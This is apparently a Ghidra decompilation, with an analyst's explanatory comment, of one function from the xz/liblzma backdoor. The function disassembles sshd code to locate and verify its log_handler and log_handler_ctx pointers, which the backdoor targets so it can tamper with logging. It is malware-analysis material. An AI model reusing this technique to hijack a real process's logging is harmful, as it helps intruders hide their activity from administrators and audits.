// /home/kali/xzre-ghidra/xzregh/102B10_validate_log_handler_pointers.c
// Function: validate_log_handler_pointers @ 0x102B10
// Calling convention: unknown
// Prototype: undefined validate_log_handler_pointers(void)


/*
 * AutoDoc: Replays sshd's code that writes `log_handler` and `log_handler_ctx`: starting from the
 * string-reference index for the logging functions it walks forward, verifies the LEA that
 * materialises the handler storage, re-identifies the function via `find_function`, and then
 * confirms that both candidate pointers are written via MOV [mem],reg instructions in that
 * window. Only when both stores are observed does it accept the pair as the real
 * log_handler/log_handler_ctx slots.
 */
#include "xzre_types.h"


bool validate_log_handler_pointers
               (ulong param_1,ulong param_2,undefined8 param_3,undefined8 param_4,long param_5,
               undefined4 *param_6)

{
  int iVar1;
  long lVar2;
  long *plVar3;
  undefined8 uVar4;
  int opcode;
  void *log_handler_slot;
  long gap;
  undefined8 insn_ptr;
  long scan_ctx;
  long block_end;
  int function_end;
  long dasm_ip;
  
  plVar3 = &scan_ctx;
  for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
    *(undefined4 *)plVar3 = 0;
    plVar3 = (long *)((long)plVar3 + 4);
  }
  if ((param_1 != param_2 && param_1 != 0) && (param_2 != 0)) {
    lVar2 = param_2 - param_1;
    if (param_2 <= param_1) {
      lVar2 = param_1 - param_2;
    }
    if (((lVar2 < 0x10) && (*(long *)(param_5 + 0x268) != 0)) && (*(long *)(param_5 + 0x288) != 0))
    {
      uVar4 = *(undefined8 *)(param_5 + 0x290);
      iVar1 = find_lea_instruction_with_mem_operand(*(long *)(param_5 + 0x288),uVar4,&scan_ctx);
      lVar2 = scan_ctx;
      if (iVar1 != 0) {
        iVar1 = x86_dasm(&scan_ctx,block_end + scan_ctx,uVar4);
        if ((iVar1 != 0) && (function_end == 0x168)) {
          insn_ptr = 0;
          lVar2 = block_end + dasm_ip + scan_ctx;
          find_function(lVar2,0,&insn_ptr,param_3,param_4,*param_6);
          uVar4 = insn_ptr;
        }
        iVar1 = find_instruction_with_mem_operand_ex(lVar2,uVar4,0,0x109,param_1);
        if (iVar1 != 0) {
          iVar1 = find_instruction_with_mem_operand_ex(lVar2,uVar4,0,0x109,param_2);
          return iVar1 != 0;
        }
      }
    }
  }
  return FALSE;
}

